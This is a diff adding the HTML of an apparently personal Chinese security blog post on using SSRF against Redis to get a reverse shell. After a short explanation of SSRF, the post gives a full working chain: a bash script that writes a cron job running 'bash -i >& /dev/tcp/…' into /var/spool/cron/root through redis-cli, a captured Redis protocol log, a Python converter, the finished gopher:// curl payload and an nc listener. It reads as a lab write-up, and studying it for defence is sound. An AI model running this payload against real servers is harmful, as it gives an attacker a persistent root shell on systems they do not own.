@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="搭个环境怪不容易的，求大佬们放过。。。  参考文献：https://joychou.org/web/phpssrf.htmlhttps://www.anquanke.com/post/id/146417 SSRF概念SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。 利用 SSRF 实现的攻击： 对外">
+<meta name="keywords" content="漏洞学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF在Redis中反弹shell">
+<meta property="og:url" content="https://cws6.github.io/2018/05/27/SSRF在Redis中反弹shell/index.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="搭个环境怪不容易的，求大佬们放过。。。  参考文献：https://joychou.org/web/phpssrf.htmlhttps://www.anquanke.com/post/id/146417 SSRF概念SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。 利用 SSRF 实现的攻击： 对外">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-03T13:42:34.618Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF在Redis中反弹shell">
+<meta name="twitter:description" content="搭个环境怪不容易的，求大佬们放过。。。  参考文献：https://joychou.org/web/phpssrf.htmlhttps://www.anquanke.com/post/id/146417 SSRF概念SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。 利用 SSRF 实现的攻击： 对外">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/2018/05/27/SSRF在Redis中反弹shell/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SSRF在Redis中反弹shell | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/05/27/SSRF在Redis中反弹shell/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSRF在Redis中反弹shell
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-05-27 20:59:43" itemprop="dateCreated datePublished" datetime="2018-05-27T20:59:43+08:00">2018-05-27</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-03 21:42:34" itemprop="dateModified" datetime="2018-12-03T21:42:34+08:00">2018-12-03</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>搭个环境怪不容易的，求大佬们放过。。。</p>
+</blockquote>
+<p>参考文献：<a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a><br><a href="https://www.anquanke.com/post/id/146417" target="_blank" rel="noopener">https://www.anquanke.com/post/id/146417</a></p>
+<h4 id="SSRF概念"><a href="#SSRF概念" class="headerlink" title="SSRF概念"></a>SSRF概念</h4><p>SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。</p>
+<h4 id="利用-SSRF-实现的攻击："><a href="#利用-SSRF-实现的攻击：" class="headerlink" title="利用 SSRF 实现的攻击："></a>利用 SSRF 实现的攻击：</h4><blockquote>
+<p>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息<br>攻击运行在内网或本地的应用程序<br>对内网 WEB 应用进行指纹识别，通过访问默认文件实现<br>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）<br>利用 <code>file</code> 协议读取本地文件</p>
+</blockquote>
+<h4 id="SSRF漏洞出现的场景"><a href="#SSRF漏洞出现的场景" class="headerlink" title="SSRF漏洞出现的场景"></a>SSRF漏洞出现的场景</h4><p>常见的危险函数：</p>
+<pre><code>fsockopen()      file_get_contents()     curl_exec()
+</code></pre><ul>
+<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB，Redis）</li>
+<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
+</ul>
+<h4 id="redis反弹shell"><a href="#redis反弹shell" class="headerlink" title="redis反弹shell"></a>redis反弹shell</h4><p><strong>环境</strong></p>
+<blockquote>
+<p>centos xx.xxx.xx.xxx ，目标（需以root方式启动redis）<br>ubuntu xxx.xx.xxx.xx，攻击方</p>
+</blockquote>
+<p><strong>redis反弹shell的bash脚本</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#shell.sh</span><br><span class="line">echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure></p>
+<p>在redis的第0个数据库中添加key为1，value为<code>\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/2333 0&gt;&amp;1\n\n\n\n</code>的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。<code>CONFIG SET</code> 命令动态地调整 Redis 服务器的配置，每个用户生成的crontab文件，都会放在 <code>/var/spool/cron/</code>目录下面，<code>set</code>直接往当前用户的crontab里写入反弹shell</p>
+<p><strong>执行脚本命令：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash shell.sh xx.xxx.xx.xxx  6379</span><br></pre></td></tr></table></figure></p>
+<p>想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:xx.xxx.xx.xxx :6379</span><br><span class="line">bash xx.xxx.xx.xxx shell.sh 4444</span><br></pre></td></tr></table></figure></p>
+<p>意思是将本机的4444端口转发到本机的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。本应在socat那个命令下捕获到数据，但是阿里云的服务器是真的强，emmm因为端口问题一直没有成功。<br><strong>这个是大佬的数据（抓不到比较难受）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2017/10/11 01:24:52.432446  length=85 from=0 to=84</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$58\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2017/10/11 01:24:52.432685  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2017/10/11 01:24:52.435153  length=57 from=0 to=56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">/var/spool/cron/\r</span><br><span class="line">&lt; 2017/10/11 01:24:52.435332  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2017/10/11 01:24:52.437594  length=52 from=0 to=51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2017/10/11 01:24:52.437760  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2017/10/11 01:24:52.439943  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2017/10/11 01:24:52.443318  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2017/10/11 01:24:52.446034  length=14 from=0 to=13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2017/10/11 01:24:52.446148  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure></p>
+<p><em>引用的话还需转换：</em></p>
+<pre><code>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。
+如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
+将\r字符串替换成%0d%0a
+空白行替换为%0a
+</code></pre><p>通过转换规则发现，如果要换IP和端口，前面的$58更改下就行了，$58表示字符串长度为58个字节，上面的EXP即是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>，3+51+4=58。如果想换成xxx.xx.xxx.xx，那么$58需要改成$62，其他不变就行<br><strong>转换脚本</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tran.py socat.log</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">#author: JoyChou</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">exp = &apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        if line[0] in &apos;&gt;&lt;+&apos;:</span><br><span class="line">            continue</span><br><span class="line">        # 判断倒数第2、3字符串是否为\r</span><br><span class="line">        elif line[-3:-1] == r&apos;\r&apos;:</span><br><span class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</span><br><span class="line">            if len(line) == 3:</span><br><span class="line">                exp = exp + &apos;%0a%0d%0a&apos;</span><br><span class="line">            else:</span><br><span class="line">                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)</span><br><span class="line">                # 去掉最后的换行符</span><br><span class="line">                line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        # 判断是否是空行，空行替换为%0a</span><br><span class="line">        elif line == &apos;\x0a&apos;:</span><br><span class="line">            exp = exp + &apos;%0a&apos;</span><br><span class="line">        else:</span><br><span class="line">            line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">            exp = exp + line</span><br><span class="line">print exp</span><br></pre></td></tr></table></figure>
+<p>结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a</span><br></pre></td></tr></table></figure></p>
+<p><strong>执行此命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://xx.xxx.xx.xxx</span><br><span class="line">:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a&apos;</span><br></pre></td></tr></table></figure></p>
+<p>出现5个ok，则成功了。</p>
+<p><strong>本地监听8989端口</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8989</span><br></pre></td></tr></table></figure></p>
+<h4 id="可能出现的问题："><a href="#可能出现的问题：" class="headerlink" title="可能出现的问题："></a>可能出现的问题：</h4><p>①(error) MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.<br>原因：强制把redis快照关闭了导致不能持久化<br>解决方法：127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no</p>
+<p>②.save Error<br>日志（vi /var/log/redis/redis-server.log）：Failed opening .rdb for saving: Read-only file system<br> emmm，找不到解决办法，有大佬知道的话请给我说下。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+       <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+</div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞学习/" rel="tag"># 漏洞学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/18/flask入门/" rel="next" title="flask入门">
+                <i class="fa fa-chevron-left"></i> flask入门
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/28/CBC字节翻转攻击/" rel="prev" title="CBC字节翻转攻击">
+                CBC字节翻转攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">59</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF概念"><span class="nav-number">1.</span> <span class="nav-text">SSRF概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用-SSRF-实现的攻击："><span class="nav-number">2.</span> <span class="nav-text">利用 SSRF 实现的攻击：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF漏洞出现的场景"><span class="nav-number">3.</span> <span class="nav-text">SSRF漏洞出现的场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#redis反弹shell"><span class="nav-number">4.</span> <span class="nav-text">redis反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可能出现的问题："><span class="nav-number">5.</span> <span class="nav-text">可能出现的问题：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
